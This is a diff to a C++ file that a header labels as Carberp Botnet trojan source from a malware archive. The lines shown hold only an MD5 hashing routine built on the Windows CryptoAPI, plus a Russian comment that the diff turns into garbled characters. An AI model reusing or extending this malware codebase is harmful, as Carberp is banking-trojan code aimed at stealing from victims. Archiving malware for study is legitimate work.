@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "stdafx.h"
 
 #include <windows.h>
@@ -96,7 +107,7 @@ bool Crypt::_md5Hash(LPBYTE output, void *inputData, DWORD dataSize)
   bool r = false;
   HCRYPTPROV hashProv;
 
-  if(CryptAcquireContextW(&hashProv, NULL, NULL, PROV_RSA_FULL /*Именно это значение, не какого иного.*/, CRYPT_VERIFYCONTEXT | CRYPT_SILENT) != FALSE)
+  if(CryptAcquireContextW(&hashProv, NULL, NULL, PROV_RSA_FULL /*пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.*/, CRYPT_VERIFYCONTEXT | CRYPT_SILENT) != FALSE)
   {
     HCRYPTHASH hashHandle;
     if(CryptCreateHash(hashProv, CALG_MD5, 0, 0, &hashHandle) == TRUE)
